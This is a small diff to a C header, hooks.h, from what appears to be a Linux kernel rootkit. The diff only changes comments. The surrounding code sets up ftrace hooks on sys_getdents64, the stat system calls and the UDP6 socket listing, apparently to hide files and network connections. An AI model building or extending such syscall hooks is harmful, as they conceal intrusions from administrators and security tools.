@@ -1,8 +1,6 @@
 #ifndef HOOKS_H
 #define HOOKS_H
 
-// падает если жать tab
-
 #include <linux/dirent.h>       // struct linux_dirent64
 #include <linux/sched.h>        // struct task_struct
 #include <linux/fdtable.h>      // struct files_struct, struct fdtable
@@ -119,6 +117,7 @@ static asmlinkage long ex_udp6_seq_show(struct seq_file *seq, void *v);
 static struct ftrace_hook EX_hooks[] = {
 	SYS_HOOK("sys_getdents64", ex_sys_getdents64, &real_sys_getdents64),
 
+	// !sys_stat64 sys_lstat64 ??
 	SYS_HOOK("sys_stat", ex_sys_stat, &real_sys_stat),
 	SYS_HOOK("sys_lstat", ex_sys_lstat, &real_sys_lstat),
 	SYS_HOOK("sys_newstat", ex_sys_newstat, &real_sys_newstat),
